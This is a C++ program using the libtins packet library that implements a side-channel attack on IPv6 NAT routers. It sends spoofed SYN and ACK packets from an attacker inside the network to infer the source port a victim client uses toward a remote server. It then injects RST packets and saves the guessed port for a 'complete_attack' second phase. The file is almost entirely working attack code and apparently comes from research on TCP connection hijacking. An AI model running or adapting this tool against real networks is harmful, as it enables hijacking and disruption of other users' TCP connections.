#include <iostream>
#include <string>
#include <cstdio>
#include <cstdlib>
#include <unistd.h>
#include <time.h>
#include <set>
#include <map>
#include <thread>
#include <tins/tins.h>
#include <fstream>
using namespace std;
using namespace Tins;


set<uint16_t> recv_dports;
pthread_t mythread[2];
pthread_mutex_t mut;

uint16_t start_port = 32768, end_port = 60999;
int port_search_range;

IPv6Address remote_server_ip, attacker_private_ip, router_wan_ip;
uint16_t remote_server_port;
uint16_t guessed_client_port;
string packet_iface;
string sniff_filter;

string self_mac_address, router_mac_address;

bool guess_port_finished = false;
bool debug = true;

EthernetII syn_pkts[40000];
EthernetII ack_pkts[40000];
double __get_us(struct timeval t) {
	return (t.tv_sec * 1000000 + t.tv_usec);
}

set<uint16_t> send_linear_SYN_and_ACKs(uint16_t begin_port) {
    if(debug) 
        cout << "send_linear_SYN_and_ACKs" << endl;
    PacketSender sender;
	NetworkInterface iface(packet_iface); 
    set<uint16_t> sent_ports;
    uint16_t max_port = (begin_port + port_search_range) < end_port ? begin_port + port_search_range : end_port;
    struct timeval start_time, stop_time;
	gettimeofday(&start_time, NULL);
    for (uint16_t port = begin_port; port < max_port; port++) {
        sender.send(syn_pkts[port - start_port], iface);
        sent_ports.insert(port);
        usleep(10);
    }
    usleep(100000);
    for (uint16_t port = begin_port; port < max_port; port++) {
        sender.send(ack_pkts[port - start_port], iface);
        usleep(10);
    }   
    gettimeofday(&stop_time, NULL);
    cout << "send_linear_SYN_and_ACKs time: " << (__get_us(stop_time) - __get_us(start_time)) /1000 << " ms" << endl;
    return sent_ports;
}

set<uint16_t> send_targeted_SYN_and_ACKs(set<uint16_t> left_ports) {
    if(debug) 
        cout << "send_targeted_SYN_and_ACKs" << endl;
    PacketSender sender;
	NetworkInterface iface(packet_iface); 
    set<uint16_t> sent_ports;
    for (set<uint16_t>::iterator itset = left_ports.begin(); itset != left_ports.end(); itset++) {
        uint16_t port = *itset;
        sender.send(syn_pkts[port - start_port], iface);
        sent_ports.insert(port);
        usleep(10);
    }
    usleep(100000);
    for (set<uint16_t>::iterator itset = sent_ports.begin(); itset != sent_ports.end(); itset++) {
        uint16_t port = *itset;
        sender.send(ack_pkts[port - start_port], iface);
        usleep(10);
    }   
    return sent_ports;
}

// Save the guessed source port to file for the second phase to use.
void save_port_to_file() {
    ofstream fout; 
    fout.open("../complete_attack/PORT_INFER_RESULT");
    fout << "source-port: " << guessed_client_port << endl;
    fout.close(); 
    return;
}

// In this thread, we will traverse the possible source port space to determine the source port used by any other client.
void guess_port() {
	PacketSender sender;
	NetworkInterface iface(packet_iface); 
    guess_port_finished = false;
	struct timeval start_time, stop_time;
	gettimeofday(&start_time, NULL);
    // In each cycle we will determine the ports in the range of [begin_port, begin_port+ port_search_range)
    for (uint16_t begin_port = start_port ; begin_port < end_port; begin_port += port_search_range) {
        if (guess_port_finished || begin_port < 10000) 
            break;
        
		set<uint16_t> left_ports;
        uint16_t max_port = (begin_port + port_search_range) < end_port ? begin_port + port_search_range : end_port;
        cout << "search range:[" << begin_port << ", " << max_port << "]" <<endl;
        for (uint16_t port = begin_port; port < max_port; port++) {
            left_ports.insert(port);
        }
        map<uint16_t,int> port_to_count; // record the times when the port is guessed right.
        bool linear_packets_sent = false;
        // continue to traverse this port range until find the port 3 times or all ports are open
        while (1) { 
            set<uint16_t> sent_ports;
            if (!linear_packets_sent) { // first, send all the packets linearly, such as [32768, 34768)
                sent_ports = send_linear_SYN_and_ACKs(begin_port); // ask the spoofable server to send linear ACKs back.
                linear_packets_sent = true;
            } else { // after that, only send the packets which are not ACKed.
                sent_ports = send_targeted_SYN_and_ACKs(left_ports);// ask the spoofable server to send targeted ACKs back.
            }
            // left_ports = sent_ports - recv_dports
            // usleep(900000);
            // sleep(1);
            usleep(100000);
            left_ports.clear();
            pthread_mutex_lock(&mut);
            set_difference(sent_ports.begin(), sent_ports.end(), recv_dports.begin(), recv_dports.end(), inserter(left_ports, left_ports.begin()));
            pthread_mutex_unlock(&mut);

            if(debug) 
                cout << "left_ports.size(): " << left_ports.size() <<endl;
            // return;
            if (left_ports.size() == 0) {
                cout << "all ports are open" << endl;
                break;
            } else {
                if (left_ports.size() == 1) {
                    uint16_t temp_port = *left_ports.begin();
                    port_to_count[temp_port] += 1;
                    if(debug) 
                        cout << "find port: " << temp_port << " for " << port_to_count[temp_port] << " times" << endl;
                    // only if we did not receive the ACK packets of this port for 3 times we consider it as the right port, i.e., the ACKs of the port have been forwarded to the victim client.
                    if (port_to_count[temp_port] >= 3) {
                        guess_port_finished = true;
                        guessed_client_port = temp_port;
                        cout << "find the client's source-port: "<< guessed_client_port << endl;
                        save_port_to_file();
                        
                        // clear the NAT mapping created by our SYN of this port.
                        EthernetII rst_pkt = EthernetII(router_mac_address, self_mac_address) /  IPv6(remote_server_ip, attacker_private_ip) / TCP(remote_server_port, guessed_client_port);
                        rst_pkt.rfind_pdu<TCP>().set_flag(TCP::RST, 1);
                        rst_pkt.rfind_pdu<TCP>().seq(1);
                        rst_pkt.rfind_pdu<IPv6>().hop_limit(6);
                        for (int m = 0; m < 10; m++){
                            sender.send(rst_pkt, iface);
                            usleep(5);
                        }
                        if(debug) {
                            gettimeofday(&stop_time, NULL);
                            cout << "time used to guess the source port: " << (__get_us(stop_time) - __get_us(start_time)) / 1000 <<  " ms" << endl;
                        }        
                        break;
                    }
                } 
            }
        }
	}
}

// sniff to receive the ACK packets and extract the dport of the ACKs.
bool callback(const PDU &pdu) {
    PacketSender sender;
	NetworkInterface iface(packet_iface); 
    const IPv6 &ip = pdu.rfind_pdu<IPv6>(); 
    const TCP &tcp = pdu.rfind_pdu<TCP>(); 
    // cout<< ip.next_header()<<endl;
	if (ip.next_header() == 6 && ip.src_addr() == remote_server_ip && ip.dst_addr() == attacker_private_ip) {
        if (tcp.sport() == remote_server_port && (tcp.flags() == TCP::ACK)) {
            if (!guess_port_finished) {
                recv_dports.insert(tcp.dport());
                // clear the NAT mapping created by our SYN of this port.
                // IP rst_pkt = IP(remote_server_ip, attacker_private_ip) / TCP(remote_server_port, tcp.dport());
                // rst_pkt.rfind_pdu<TCP>().set_flag(TCP::RST, 1);
                // rst_pkt.rfind_pdu<TCP>().seq(1);
                // rst_pkt.rfind_pdu<IP>().ttl(6);
                // sender.send(rst_pkt, iface);
            }
        }
	}
    return true;
}

void sniff_packets() {
    // Construct the sniffer configuration object
    SnifferConfiguration config;
    config.set_filter(sniff_filter);
	config.set_immediate_mode(true);
    // Construct the sniffer we'll use
    Sniffer(packet_iface, config).sniff_loop(callback);
}



int main(int argc, char** argv)
{
    if (argc != 9) {
        cout << "wrong number of args" << endl;
        return 0;
    }
    attacker_private_ip = IPv6Address(argv[1]);
    remote_server_ip = IPv6Address(argv[2]);
    remote_server_port = atoi(argv[3]);
    router_wan_ip = IPv6Address(argv[4]);
    packet_iface = argv[5];
    self_mac_address = argv[6];
    router_mac_address = argv[7];
    port_search_range = atoi(argv[8]);

    sniff_filter = "tcp port " + string(argv[3]);
    // sniff_filter = "tcp port " + string(argv[3]) + " and ipv6 src " + argv[2];
    PacketSender sender;
	NetworkInterface iface(packet_iface); 
    // initialize the SYN packets for latter use
    for (int i = 0; i < end_port - start_port ; i++) {
        syn_pkts[i] = EthernetII(router_mac_address, self_mac_address) / IPv6(remote_server_ip, attacker_private_ip) / TCP(remote_server_port, start_port + i);
        syn_pkts[i].rfind_pdu<IPv6>().hop_limit(2);
        syn_pkts[i].rfind_pdu<TCP>().set_flag(TCP::SYN, 1);
        syn_pkts[i].rfind_pdu<TCP>().seq(1);
    }
    for (int i = 0; i < end_port - start_port ; i++) {
        ack_pkts[i] = EthernetII(router_mac_address, self_mac_address) / IPv6(router_wan_ip, remote_server_ip) / TCP(start_port + i, remote_server_port);
        ack_pkts[i].rfind_pdu<IPv6>().hop_limit(4);
        // ack_pkts[i].rfind_pdu<TCP>().set_flag(TCP::SYN, 1);
        ack_pkts[i].rfind_pdu<TCP>().set_flag(TCP::ACK, 1);
        ack_pkts[i].rfind_pdu<TCP>().seq(1);
        ack_pkts[i].rfind_pdu<TCP>().ack_seq(2);
    }

    // connect to the spoofable server and control it to send ACK packets.

    // start the sniff thread
    pthread_mutex_init(&mut, NULL);
    thread sniff_thread(sniff_packets);
    // start the main thread to guess the client source port.
    guess_port();
    sleep(1);
    sniff_thread.detach();

	return 0;
}
